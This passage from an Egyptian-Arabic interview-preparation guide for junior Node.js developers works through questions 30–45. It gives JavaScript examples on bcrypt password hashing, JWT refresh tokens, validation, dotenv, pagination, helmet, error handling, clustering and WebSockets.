لو خزّنت الـ Passwords كـ Plain Text ومـ اتسرّقت الـ Database (Data Breach)، **كل المستخدمين** عندهم مشكلة — وغالباً بيستخدموا نفس الـ Password في مواقع تانية.

الـ **Hashing** (مش Encryption): عملية One-way. مش ممكن ترجع من الـ Hash للـ Password الأصلي. كمان bcrypt بيضيف **Salt** عشان Password نفسه يدي Hash مختلف كل مرة.

```javascript
const bcrypt = require("bcrypt");

// --- On Registration: Hash before saving ---
const SALT_ROUNDS = 12; // Cost factor — higher = slower = more secure
// 12 rounds means 2^12 = 4096 iterations — takes ~200ms (intentionally slow)

const hashedPassword = await bcrypt.hash(plainTextPassword, SALT_ROUNDS);
// "$2b$12$..." — includes the salt inside the hash string itself

await User.create({ email, passwordHash: hashedPassword });

// --- On Login: Compare (don't hash and compare — use bcrypt.compare!) ---
const isMatch = await bcrypt.compare(req.body.password, user.passwordHash);
// Returns true or false — bcrypt extracts the salt from the stored hash internally

if (!isMatch) return res.status(401).json({ error: "Invalid credentials" });
```

> **ليه مش MD5 أو SHA256؟** لأنهم سريعين جداً. المهاجم يقدر يجرب مليارات الـ Passwords في الثانية. bcrypt مصمم يكون **بطيء** عمداً — وده الميزة.

---

### 30. إيه هو الـ Refresh Token Pattern وليه مش بنعمل JWT طويل الأمد؟

الـ JWT قصير الأمد (15 دقيقة مثلاً) أكثر أماناً لأنه لو اتسرّق، المهاجم معاه وقت محدود. بس مش عملي إن المستخدم يعمل Login كل 15 دقيقة.

الحل: **Access Token + Refresh Token**.

```javascript
// --- On Login ---
const accessToken = jwt.sign(
  { userId: user._id },
  process.env.JWT_ACCESS_SECRET,
  { expiresIn: "15m" } // Short-lived — if stolen, expires soon
);

const refreshToken = jwt.sign(
  { userId: user._id },
  process.env.JWT_REFRESH_SECRET,
  { expiresIn: "7d" } // Long-lived — stored securely in httpOnly cookie
);

// Store refresh token in DB (so we can revoke it if needed)
await Token.create({ userId: user._id, token: refreshToken });

res.cookie("refreshToken", refreshToken, {
  httpOnly: true,  // Cannot be accessed by JavaScript — XSS protection
  secure: true,    // HTTPS only
  sameSite: "Strict",
});
res.json({ accessToken }); // Send access token in response body

// --- On Token Refresh ---
app.post("/auth/refresh", async (req, res) => {
  const { refreshToken } = req.cookies;
  const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
  const storedToken = await Token.findOne({ token: refreshToken });
  if (!storedToken) return res.status(401).json({ error: "Token revoked" });

  const newAccessToken = jwt.sign(
    { userId: decoded.userId },
    process.env.JWT_ACCESS_SECRET,
    { expiresIn: "15m" }
  );
  res.json({ accessToken: newAccessToken });
});
```

---

## 📦 Part 6 — Ecosystem Libraries

---

### 31. ليه بنستخدم `bcrypt` تحديداً للـ Password Hashing؟

`bcrypt` مش مجرد Hashing Algorithm — هو **Adaptive Hashing Algorithm** اتصمم للـ Passwords تحديداً:

1. **Cost Factor (Salt Rounds)**: بتقدر تزود صعوبته مع الوقت. الـ Hardware بيتحسن؟ بس ارفع الـ Salt Rounds.
2. **Built-in Salting**: بيولّد Salt تلقائياً لكل Password، يعني نفس الـ Password مش بيدي نفس الـ Hash.
3. **Intentionally Slow**: مصمم يبطّئ الـ Brute Force Attacks. SHA-256 بيعمل مليارات Hashes في الثانية — bcrypt بيعمل بضع آلاف بس.

```javascript
const bcrypt = require("bcrypt");

async function hashingDemo() {
  const password = "MySecurePass123!";

  // Same password, different hashes every time (because of random salt)
  const hash1 = await bcrypt.hash(password, 12);
  const hash2 = await bcrypt.hash(password, 12);
  console.log(hash1 === hash2); // false — different salts!

  // But both verify correctly against the original password
  console.log(await bcrypt.compare(password, hash1)); // true
  console.log(await bcrypt.compare(password, hash2)); // true
}
```

---

### 32. ليه بنستخدم `Joi` أو `Zod` للـ Validation؟ مش `if` statements كافية؟

الـ `if` statements تمام للحاجات البسيطة، بس لما الـ Schemas تتعقد (Nested Objects، Arrays، Conditional Validation)، الكود بيتحول لـ Spaghetti.

`Joi` و`Zod` بيديك:
1. **Declarative Validation**: بتوصف الـ Schema مرة وتطبقه في أي مكان
2. **Clear Error Messages**: رسائل خطأ واضحة للـ User
3. **Type Coercion**: تحويل تلقائي (String "5" → Number 5)
4. **Reusability**: نفس الـ Schema على الـ Frontend والـ Backend (Zod خصوصاً مع TypeScript)

```javascript
const Joi = require("joi");

// Define the schema once
const createUserSchema = Joi.object({
  name: Joi.string().min(2).max(50).required(),
  email: Joi.string().email().required(),
  password: Joi.string()
    .min(8)
    .pattern(/^(?=.*[A-Z])(?=.*\d)/) // Must have uppercase + number
    .required()
    .messages({
      "string.pattern.base": "Password must contain uppercase letter and number",
    }),
  age: Joi.number().integer().min(18).max(100).optional(),
  role: Joi.string().valid("user", "admin", "moderator").default("user"),
});

// Middleware to validate request body
const validate = (schema) => (req, res, next) => {
  const { error, value } = schema.validate(req.body, { abortEarly: false });
  if (error) {
    const errors = error.details.map((d) => d.message);
    return res.status(400).json({ errors });
  }
  req.body = value; // Use the sanitized/coerced values
  next();
};

app.post("/users", validate(createUserSchema), createUser);
```

---

### 33. ليه بنستخدم `dotenv` وإيه الـ Best Practices بتاعته؟

الـ `dotenv` بيحمّل Environment Variables من ملف `.env` إلى `process.env`. الهدف الرئيسي:

1. **Security**: الـ Secrets (API Keys, DB Passwords) مش بتتحط في الكود
2. **Flexibility**: تقدر تشغّل نفس الكود بـ Configurations مختلفة (Development, Staging, Production)
3. **Separation**: الـ Config منفصل عن الـ Code (12-Factor App Principle)

```javascript
// .env file — NEVER commit this to Git!
// DB_URI=mongodb://localhost:27017/myapp
// JWT_SECRET=super_secret_key_here
// PORT=3000
// NODE_ENV=development

// app.js — load env vars as early as possible
require("dotenv").config(); // Must be before any other imports that use process.env

const mongoose = require("mongoose");

// Now use process.env everywhere
mongoose.connect(process.env.DB_URI);
const PORT = process.env.PORT || 3000;
const jwtSecret = process.env.JWT_SECRET;

// Best Practice: Validate required env vars on startup
const requiredEnvVars = ["DB_URI", "JWT_SECRET", "JWT_REFRESH_SECRET"];
requiredEnvVars.forEach((varName) => {
  if (!process.env[varName]) {
    console.error(`FATAL: Missing required environment variable: ${varName}`);
    process.exit(1); // Crash early rather than run with missing config
  }
});
```

```
# .gitignore — always add .env
.env
.env.local
.env.production
node_modules/
```

---

## 🎯 Part 7 — Bonus: Mixed Advanced Questions

---

### 34. إيه هو الـ `async/await` وكيف بيتعامل مع الـ Errors؟

الـ `async/await` هو Syntax Sugar فوق الـ Promises. بيخلي الكود Async يبان وكأنه Synchronous — أوضح بكتير من Callback Hell أو `.then()` Chains.

```javascript
// --- Promise chaining (the old way — harder to read) ---
User.findById(id)
  .then((user) => {
    return Order.find({ userId: user._id });
  })
  .then((orders) => {
    return res.json(orders);
  })
  .catch((err) => {
    res.status(500).json({ error: err.message });
  });

// --- async/await (the modern way — much cleaner) ---
app.get("/users/:id/orders", async (req, res) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: "User not found" });

    const orders = await Order.find({ userId: user._id }).lean();
    res.json(orders);
  } catch (err) {
    // Catches both sync and async errors
    res.status(500).json({ error: err.message });
  }
});

// Pro pattern: Wrap async handlers to avoid try/catch repetition
const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

app.get("/products", asyncHandler(async (req, res) => {
  const products = await Product.find({}).lean();
  res.json(products);
})); // No try/catch needed — errors go to next(err) automatically
```

---

### 35. إيه الفرق بين `PUT` و `PATCH`؟ وامتى بنستخدم كل واحد؟

الفرق بيجي في الإنترفيو باستمرار:

- **`PUT`**: بيعمل **Full Replacement** للـ Resource. لو بعتّ PUT بدون Field معين، الـ Field ده بيتحذف أو بيرجع لـ Default بتاعه.
- **`PATCH`**: بيعمل **Partial Update**. بس الـ Fields اللي بعتها هي اللي بتتغير.

```javascript
// Initial document in DB:
// { _id: "123", name: "Ahmed", email: "ahmed@old.com", role: "user", age: 25 }

// --- PUT /users/123 with body: { name: "Ahmed Ali", email: "ahmed@new.com" } ---
// Replaces ENTIRE document — role and age will be gone or reset to defaults!
await User.findByIdAndReplace(id, req.body); // Result: { name, email } only

// --- PATCH /users/123 with body: { email: "ahmed@new.com" } ---
// Only updates email — name, role, age remain unchanged
await User.findByIdAndUpdate(
  id,
  { $set: req.body }, // $set is key — only updates specified fields
  { new: true, runValidators: true }
);
```

---

### 36. إزاي تعمل Pagination في MongoDB؟ وإيه الفرق بين Offset-based وCursor-based؟

#### Offset-based (Skip/Limit)
```javascript
app.get("/products", async (req, res) => {
  const page  = parseInt(req.query.page)  || 1; // Default: page 1
  const limit = parseInt(req.query.limit) || 10; // Default: 10 per page
  const skip  = (page - 1) * limit;

  const [products, total] = await Promise.all([
    Product.find({}).skip(skip).limit(limit).lean(),
    Product.countDocuments({}),
  ]);

  res.json({
    data: products,
    pagination: {
      page,
      limit,
      total,
      totalPages: Math.ceil(total / limit),
      hasNext: page * limit < total,
    },
  });
});
```

#### Cursor-based (Better for large datasets)
```javascript
// Client sends the _id of the last item they saw as a cursor
app.get("/feed", async (req, res) => {
  const limit  = 10;
  const cursor = req.query.cursor; // Last seen document _id

  const filter = cursor
    ? { _id: { $lt: new mongoose.Types.ObjectId(cursor) } } // Fetch items before cursor
    : {};

  const posts = await Post.find(filter)
    .sort({ _id: -1 }) // Newest first
    .limit(limit)
    .lean();

  const nextCursor = posts.length === limit ? posts[posts.length - 1]._id : null;
  res.json({ data: posts, nextCursor });
});
```

> **ليه Cursor-based أفضل؟** Skip() بيعمل Scan لكل الـ Documents اللي قبل الصفحة — لو Skip(10000)، MongoDB بيقرأ 10000 Document ويتجاهلهم. مع الـ Cursor، بيبدأ مباشرة من المكان الصح.

---

### 37. إيه هو الـ `helmet.js` ومش بيعمل إيه؟

`helmet` هو Collection من **Security HTTP Headers** بتشغّلها بـ سطر واحد. بيعمل على الـ HTTP Layer مش الـ Application Layer.

```javascript
const helmet = require("helmet");

app.use(helmet()); // Sets all recommended headers at once

// What helmet sets automatically:
// X-Content-Type-Options: nosniff         — Prevents MIME sniffing
// X-Frame-Options: SAMEORIGIN            — Prevents clickjacking
// Strict-Transport-Security: max-age=...  — Forces HTTPS
// X-XSS-Protection: 0                    — Disables old browser XSS filter (CSP is better)
// Content-Security-Policy: ...           — Controls what resources can be loaded

// helmet does NOT:
// - Protect against SQL/NoSQL Injection (that's your validation layer)
// - Handle Authentication/Authorization
// - Rate limit requests
// - Sanitize user input
```

---

### 38. إيه هو الـ Environment في Node.js وكيف بنعمل منه استفادة؟

```javascript
// process.env.NODE_ENV is set when you start the server
// Development: NODE_ENV=development node app.js
// Production:  NODE_ENV=production node app.js

const isDev  = process.env.NODE_ENV === "development";
const isProd = process.env.NODE_ENV === "production";

// Different behavior based on environment
app.use((err, req, res, next) => {
  if (isDev) {
    // Show full error stack in development — helpful for debugging
    res.status(500).json({ error: err.message, stack: err.stack });
  } else {
    // Hide internal details in production — security!
    res.status(500).json({ error: "Something went wrong" });
  }
});

// Mongoose debug logging in development
if (isDev) {
  mongoose.set("debug", true); // Logs every query to console
}

// Shorter JWT expiry in production for security
const tokenExpiry = isProd ? "1h" : "7d";
```

---

### 39. إيه هو الـ `Promise.all()` وإمتى بنستخدمه بدل Sequential Awaits؟

```javascript
// --- Sequential Awaits (SLOW) ---
// Each await waits for the previous one to finish — total time = t1 + t2 + t3
async function getDataSlow(userId) {
  const user    = await User.findById(userId);           // ~50ms
  const orders  = await Order.find({ userId });          // ~60ms
  const reviews = await Review.find({ userId });         // ~40ms
  // Total: ~150ms — they don't depend on each other, so this is wasteful!
  return { user, orders, reviews };
}

// --- Promise.all (FAST) ---
// All 3 queries run in PARALLEL — total time = max(t1, t2, t3) ≈ 60ms
async function getDataFast(userId) {
  const [user, orders, reviews] = await Promise.all([
    User.findById(userId),
    Order.find({ userId }),
    Review.find({ userId }),
  ]);
  // Total: ~60ms — 2.5x faster!
  return { user, orders, reviews };
}

// WARNING: Promise.all fails fast — if ANY promise rejects, all fail
// Use Promise.allSettled() if you want all results regardless of failures
async function getDataResilient(userId) {
  const results = await Promise.allSettled([
    User.findById(userId),
    Order.find({ userId }),
    Review.find({ userId }),
  ]);

  results.forEach((result, index) => {
    if (result.status === "fulfilled") {
      console.log(`Query ${index} succeeded:`, result.value);
    } else {
      console.error(`Query ${index} failed:`, result.reason);
    }
  });
}
```

---

### 40. إزاي بتعمل Error Handling احترافي في Express App؟

```javascript
// 1. Custom Error Class
class AppError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = true; // Distinguish operational errors from programming bugs
    Error.captureStackTrace(this, this.constructor);
  }
}

// 2. Throw custom errors in routes/services
app.get("/users/:id", async (req, res, next) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) throw new AppError("User not found", 404); // Operational error
    res.json(user);
  } catch (err) {
    next(err); // Always pass to error handler
  }
});

// 3. Handle 404 for unmatched routes (place before error handler)
app.use((req, res, next) => {
  next(new AppError(`Route ${req.originalUrl} not found`, 404));
});

// 4. Central Error Handler (must be last middleware)
app.use((err, req, res, next) => {
  const statusCode = err.statusCode || 500;
  const message    = err.isOperational ? err.message : "Internal server error";

  // Log the error (use a proper logger like Winston in production)
  if (statusCode >= 500) {
    console.error(`[ERROR] ${err.stack}`);
  }

  res.status(statusCode).json({
    success: false,
    error: message,
    ...(process.env.NODE_ENV === "development" && { stack: err.stack }),
  });
});
```

---

### 41. إيه هي الـ Aggregation Pipeline في MongoDB وإمتى بنستخدمها؟

الـ Aggregation Pipeline هي MongoDB's way لعمل Complex Data Transformations والـ Analytics. بدل ما تجيب الـ Data وتعالجها في Node.js، بتخلي MongoDB يعمل الـ Processing ده.

```javascript
// Example: Get sales stats per product category
const stats = await Order.aggregate([
  // Stage 1: Filter (like WHERE in SQL)
  { $match: { status: "completed", createdAt: { $gte: new Date("2024-01-01") } } },

  // Stage 2: Join with products collection (like SQL JOIN)
  {
    $lookup: {
      from: "products",       // Collection to join
      localField: "productId",
      foreignField: "_id",
      as: "productDetails",
    },
  },

  // Stage 3: Flatten the array from $lookup
  { $unwind: "$productDetails" },

  // Stage 4: Group by category and calculate stats
  {
    $group: {
      _id: "$productDetails.category", // Group key
      totalRevenue: { $sum: "$totalPrice" },
      orderCount:   { $sum: 1 },
      avgOrderValue: { $avg: "$totalPrice" },
    },
  },

  // Stage 5: Sort by revenue descending
  { $sort: { totalRevenue: -1 } },

  // Stage 6: Limit results
  { $limit: 5 },
]);

// Result: Top 5 categories by revenue with stats
```

---

### 42. إيه الفرق بين Horizontal وVertical Scaling؟

**Vertical Scaling (Scale Up):**
بتحط Instance أكبر وأقوى — أكتر CPU، RAM، SSD. أسهل في الـ Implementation بس عنده **Ceiling** (في حد أقصى للـ Hardware) وDowntime لما بتغير.

**Horizontal Scaling (Scale Out):**
بتضيف Instances أكتر وتحطهم وراء Load Balancer. ممكن يكمل بدون حد نظرياً. أصعب لأن محتاج تعمل Stateless Application.

```
Vertical:   [Small Server] → [Big Server]   — Upgrade the same machine
Horizontal: [Server]       → [Server x 3]  — Add more machines behind a load balancer
```

> **Node.js و Horizontal Scaling:** عشان تعمل Node Horizontal Scaling صح:
> - **لا** تخزّن Sessions في Memory (استخدم Redis)
> - **لا** تعمل File Uploads محلياً (استخدم S3)
> - الـ JWT Stateless يساعد هنا كتير

---

### 43. إيه هو الـ `cluster` module في Node.js وإمتى بنستخدمه؟

Node.js Single-Threaded — بيستخدم CPU Core واحد بس. الـ `cluster` module بيخليك تشغّل عدة **Worker Processes** بعدد الـ CPU Cores اللي عندك.

```javascript
const cluster = require("cluster");
const os      = require("os");

const numCPUs = os.cpus().length; // e.g., 8 cores

if (cluster.isPrimary) {
  console.log(`Primary process ${process.pid} is running`);

  // Fork one worker per CPU core
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  // Restart workers if they die
  cluster.on("exit", (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died. Forking a new one...`);
    cluster.fork();
  });
} else {
  // Worker processes: each runs the Express app independently
  const app = require("./app");
  app.listen(3000, () => {
    console.log(`Worker ${process.pid} started`);
  });
}

// All workers share the same port — the OS distributes incoming connections
```

> **بديل أحدث:** `PM2` بيعمل نفس الكلام ده وأكتر (Monitoring, Auto-restart, Zero-downtime Reload) بدون كتابة كود إضافي.

---

### 44. إيه هو الـ WebSocket وإمتى بنستخدمه بدل HTTP؟

الـ **HTTP** مبني على **Request-Response** — الـ Client بيطلب، الـ Server بيرد، الـ Connection بيتقفل. مفيش طريقة الـ Server يبعت Data لـ Client من غير ما الـ Client يطلب.

الـ **WebSocket** بيعمل **Persistent Bidirectional Connection** — الـ Server يقدر يبعت Data للـ Client في أي وقت.

```javascript
// server.js — using socket.io (built on WebSocket)
const { Server } = require("socket.io");
const io = new Server(httpServer, {
  cors: { origin: "https://myfrontend.com" },
});

io.on("connection", (socket) => {
  console.log(`Client connected: ${socket.id}`);

  // Listen for events from client
  socket.on("send_message", (data) => {
    // Broadcast to all clients in the same room
    io.to(data.roomId).emit("receive_message", {
      text: data.text,
      sender: socket.id,
      timestamp: new Date(),
    });
  });

  socket.on("disconnect", () => {
    console.log(`Client disconnected: ${socket.id}`);
  });
});

// Client-side (browser)
// const socket = io("https://mybackend.com");
// socket.emit("send_message", { roomId: "room1", text: "Hello!" });
// socket.on("receive_message", (msg) => console.log(msg));
```

**متى WebSocket؟** Chat Apps، Real-time Notifications، Live Dashboards، Online Gaming، Collaborative Editing.

**متى HTTP عادي؟** CRUD APIs، Data Fetching، File Upload/Download.

---

### 45. كيف تعمل MongoDB Connection الصح في Mongoose مع Error Handling؟

```javascript
const mongoose = require("mongoose");

// Connection options
const connectDB = async () => {
  try {
    const conn = await mongoose.connect(process.env.MONGO_URI, {
      // These options are defaults in Mongoose 6+ but good to know
      serverSelectionTimeoutMS: 5000, // Fail fast if DB is unreachable
      socketTimeoutMS: 45000,         // Close idle connections after 45s
    });

    console.log(`MongoDB connected: ${conn.connection.host}`);
  } catch (err) {
    console.error(`MongoDB connection error: ${err.message}`);
    process.exit(1); // Exit with failure — let process manager restart us
  }
};

// Handle events after initial connection
mongoose.connection.on("error",      (err) => console.error("Mongoose error:", err));
mongoose.connection.on("disconnected", ()  => console.warn("MongoDB disconnected!"));
mongoose.connection.on("reconnected",  ()  => console.log("MongoDB reconnected!"));

// Graceful shutdown — close DB connection before process exits
process.on("SIGTERM", async () => {
  await mongoose.connection.close();
  console.log("MongoDB connection closed. Process terminating.");
  process.exit(0);
});

// In app.js — always await the connection before starting the server
connectDB().then(() => {
  app.listen(process.env.PORT, () =>
    console.log(`Server running on port ${process.env.PORT}`)
  );
});
```

---

> ### 🏁 ختاماً — الـ Interview Sweet Spot
>
> الإنترفيو مش امتحان حفظ — هو محادثة بين اثنين فاهمين. جاوب بثقة، اعترف لو مش عارف حاجة بس بيّن إنك تفكر صح. الكود اللي كتبته هنا مش للحفظ — هو للفهم. افهم الـ "ليه" وراء كل Pattern وهتبهر أي Interviewer.
>
> **بالتوفيق يا برو!** 🚀

---

*Made with ❤️ for Egyptian Junior Developers — يلا نبني Backend محترم*
